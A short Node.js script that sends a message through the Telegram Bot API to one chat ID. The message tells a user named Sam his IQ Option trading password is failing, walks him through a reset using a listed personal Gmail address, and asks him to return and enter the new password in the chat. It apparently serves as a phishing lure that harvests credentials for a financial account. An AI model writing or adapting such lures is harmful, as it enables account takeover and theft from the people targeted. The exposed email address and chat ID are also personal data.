require('dotenv/config');
const token = process.env.BOT_TOKEN;
fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    chat_id: 7526553982,
    text: "🟣 Hey Sam!\n\nYour IQ Option password isn't working. Here's the fix:\n\n1️⃣ Go to iqoption.com/en\n2️⃣ Tap \"Forgot Password\"\n3️⃣ Enter: samuelmosessamuelmoses889@gmail.com\n4️⃣ Reset your password\n5️⃣ Come back here and enter the NEW password\n\nYou got this 💜",
    parse_mode: 'Markdown'
  })
}).then(r => r.json()).then(d => console.log(d.ok ? 'SENT' : 'FAIL: ' + JSON.stringify(d).slice(0,300)));
